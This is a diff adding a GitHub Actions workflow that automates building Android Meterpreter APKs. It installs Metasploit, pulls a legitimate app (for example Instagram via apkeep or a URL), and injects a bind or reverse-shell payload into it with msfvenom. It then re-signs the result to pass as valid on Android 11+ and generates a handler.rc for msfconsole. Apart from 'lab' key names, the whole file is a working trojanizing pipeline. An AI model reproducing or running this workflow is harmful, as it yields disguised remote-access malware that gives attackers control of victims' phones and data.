@@ -1,1 +1,250 @@
+name: Android Meterpreter APK (bind)
 
+on:
+  workflow_dispatch:
+    inputs:
+      payload:
+        description: "Payload"
+        required: true
+        default: android/meterpreter/bind_tcp
+        type: choice
+        options:
+          - android/meterpreter/bind_tcp
+          - android/meterpreter/reverse_tcp
+          - android/meterpreter/reverse_https
+      lport:
+        description: "LPORT: bind port the phone listens on (or callback port)"
+        required: false
+        default: "5555"
+      lhost:
+        description: "LHOST (only used by reverse payloads)"
+        required: false
+        default: "203.0.113.10"
+      rhost:
+        description: "Device IP for the bind handler (you connect out to the phone)"
+        required: false
+        default: "192.168.1.50"
+      template_apk:
+        description: "Path in repo to the real APK (e.g. apk/template.apk)"
+        required: false
+        default: ""
+      template_url:
+        description: "OR direct URL to a single APK (used if template_apk is empty)"
+        required: false
+        default: ""
+      apkeep_package:
+        description: "OR app id to fetch from APKPure via apkeep (e.g. com.instagram.android)"
+        required: false
+        default: ""
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    env:
+      PAYLOAD: ${{ inputs.payload || 'android/meterpreter/bind_tcp' }}
+      LHOST: ${{ inputs.lhost || '203.0.113.10' }}
+      LPORT: ${{ inputs.lport || '5555' }}
+      RHOST: ${{ inputs.rhost || '192.168.1.50' }}
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          lfs: true   # pulls APKs tracked with Git LFS
+
+      - name: Setup Java 17
+        uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      # ---------- apktool + signers + apkeep ----------
+      - name: Install apktool and APK tooling
+        run: |
+          set -euo pipefail
+          sudo apt-get update
+          sudo apt-get install -y curl jq unzip zip apktool || true
+
+          # latest apktool jar as fallback (apt version is often stale)
+          if ! command -v apktool >/dev/null || ! apktool --version >/dev/null 2>&1; then
+            echo "apt apktool missing, installing jar"
+            URL=$(curl -fsSL https://api.github.com/repos/iBotPeaches/Apktool/releases/latest \
+                  | jq -r '.assets[].browser_download_url' | grep -E 'apktool_.*\.jar$' | head -n1)
+            sudo curl -fsSL "$URL" -o /usr/local/lib/apktool.jar
+            printf '#!/bin/sh\nexec java -jar /usr/local/lib/apktool.jar "$@"\n' | sudo tee /usr/local/bin/apktool >/dev/null
+            sudo chmod +x /usr/local/bin/apktool
+          fi
+          apktool --version
+
+          # needed for Android 11+ (v2/v3 signatures). Optional: guarded later.
+          sudo apt-get install -y apksigner zipalign || true
+
+          # apkeep: fetch a single universal APK from APKPure
+          curl -fsSL -o /tmp/apkeep.tar.gz \
+            https://github.com/EFForg/apkeep/releases/latest/download/apkeep-x86_64-unknown-linux-musl.tar.gz || true
+          if tar xzf /tmp/apkeep.tar.gz -C /tmp 2>/dev/null; then
+            sudo mv /tmp/apkeep-*/apkeep /usr/local/bin/apkeep 2>/dev/null || true
+            sudo chmod +x /usr/local/bin/apkeep || true
+          fi
+          command -v apkeep && apkeep --version || echo "apkeep not installed (optional)"
+
+          echo "--- tool paths ---"
+          for t in java apktool keytool jarsigner apksigner zipalign apkeep; do
+            printf '%-10s %s\n' "$t" "$(command -v $t || echo MISSING)"
+          done
+
+      # ---------- install metasploit ----------
+      - name: Install Metasploit Framework (Rapid7 omnibus)
+        run: |
+          curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
+          chmod 755 msfinstall
+          sudo ./msfinstall
+          echo "/opt/metasploit-framework/bin" >> "$GITHUB_PATH"
+
+      - name: Init database (optional)
+        continue-on-error: true
+        run: |
+          sudo service postgresql start || true
+          sudo -u postgres createuser -s "$USER" || true
+          sudo msfdb init || true
+
+      - name: Verify Metasploit + payload
+        run: |
+          msfconsole --version
+          msfvenom -l payloads | grep -F "$PAYLOAD" || { echo "payload $PAYLOAD not found"; exit 1; }
+
+      # ---------- resolve the real app ----------
+      - name: Resolve template APK (repo path > URL > apkeep)
+        env:
+          T_INPUT: ${{ inputs.template_apk }}
+          T_URL: ${{ inputs.template_url }}
+          T_PKG: ${{ inputs.apkeep_package }}
+        run: |
+          set -euo pipefail
+          mkdir -p apk out
+          T=""
+
+          if [ -n "${T_INPUT:-}" ] && [ -f "$T_INPUT" ]; then
+            echo "using repo file: $T_INPUT"
+            T="$T_INPUT"
+
+          elif [ -n "${T_URL:-}" ]; then
+            echo "downloading: $T_URL"
+            curl -fL --retry 3 -A "Mozilla/5.0" -o apk/template.apk "$T_URL"
+            T="apk/template.apk"
+
+          elif [ -n "${T_PKG:-}" ] && command -v apkeep >/dev/null; then
+            echo "fetching $T_PKG with apkeep"
+            apkeep -a "$T_PKG" -d apk-pure apk/ || true
+            T="$(ls -1 apk/${T_PKG}*.apk 2>/dev/null | head -n1 || true)"
+          fi
+
+          echo "TEMPLATE=$T" >> "$GITHUB_ENV"
+          echo "resolved template = '${T:-<none>}'"
+
+      - name: Validate template APK
+        run: |
+          set -euo pipefail
+          if [ -z "${TEMPLATE:-}" ]; then
+            echo "No template supplied - standalone APK only"
+            exit 0
+          fi
+          file "$TEMPLATE"
+          ls -lh "$TEMPLATE"
+          unzip -l "$TEMPLATE" | grep -q 'AndroidManifest.xml' || { echo "not an APK"; exit 1; }
+          unzip -l "$TEMPLATE" | grep -qE 'classes[0-9]*\.dex' || { echo "no classes.dex - split APK?"; exit 1; }
+          echo "--- resources.arsc / signature ---"
+          unzip -l "$TEMPLATE" | grep -E 'resources\.arsc|META-INF/.*\.(RSA|DSA|EC)$' || true
+          echo "--- decode test with apktool ---"
+          apktool d -f -o /tmp/tpl "$TEMPLATE" >/dev/null
+          echo "apktool decode OK"
+
+      # ---------- build ----------
+      - name: Build APK(s)
+        run: |
+          set -euo pipefail
+          OPTS=(LPORT="$LPORT")
+          case "$PAYLOAD" in
+            *bind*) echo "bind payload: LHOST not needed" ;;
+            *)      OPTS+=(LHOST="$LHOST") ;;
+          esac
+
+          echo "== standalone =="
+          msfvenom -p "$PAYLOAD" "${OPTS[@]}" -f raw -o out/standalone.apk
+
+          if [ -n "${TEMPLATE:-}" ]; then
+            echo "== bound into $TEMPLATE =="
+            msfvenom -p "$PAYLOAD" "${OPTS[@]}" -x "$TEMPLATE" -f raw -o out/bound.apk
+          else
+            echo "no template - skipping injection"
+          fi
+          ls -lh out
+
+      - name: Re-sign for Android 11+ (v1+v2)
+        run: |
+          set -euo pipefail
+          if ! command -v apksigner >/dev/null; then
+            echo "apksigner missing - msfvenom's default v1 signature kept"
+            exit 0
+          fi
+          keytool -genkeypair -keystore lab.jks -alias lab -keyalg RSA -keysize 2048 \
+            -validity 10000 -storepass labpass -keypass labpass \
+            -dname "CN=lab, OU=pentest, O=lab, C=US"
+          for f in out/*.apk; do
+            [ -e "$f" ] || continue
+            case "$f" in *-signed.apk) continue ;; esac
+            apksigner sign --ks lab.jks --ks-pass pass:labpass --key-pass pass:labpass \
+              --v1-signing-enabled true --v2-signing-enabled true \
+              --out "${f%.apk}-signed.apk" "$f"
+            echo "== verify ${f%.apk}-signed.apk =="
+            apksigner verify --verbose "${f%.apk}-signed.apk" || true
+          done
+          ls -lh out
+
+      - name: Generate handler.rc
+        run: |
+          set -euo pipefail
+          {
+            echo "# msfconsole -r handler.rc"
+            echo "use exploit/multi/handler"
+            echo "set payload $PAYLOAD"
+            echo "set LHOST 0.0.0.0"
+            echo "set LPORT $LPORT"
+            case "$PAYLOAD" in
+              *bind*) echo "set RHOST $RHOST   # phone IP - you connect to it" ;;
+              *)      echo "set LHOST $LHOST" ;;
+            esac
+            echo "set ExitOnSession false"
+            echo "run -j"
+          } > out/handler.rc
+          cat out/handler.rc
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: android-apk-${{ github.run_number }}
+          path: out/
+          if-no-files-found: error
+          retention-days: 7
+
+      - name: Summary
+        run: |
+          {
+            echo "### Build summary"
+            echo ""
+            echo "- payload: \`$PAYLOAD\`"
+            echo "- LPORT: \`$LPORT\`  (bind port on the phone)"
+            echo "- template: \`${TEMPLATE:-<none>}\`"
+            echo ""
+            echo "| file | size |"
+            echo "|---|---|"
+            for f in out/*.apk out/handler.rc; do
+              [ -e "$f" ] && echo "| \`$(basename "$f")\` | $(du -h "$f" | cut -f1) |"
+            done
+          } >> "$GITHUB_STEP_SUMMARY"
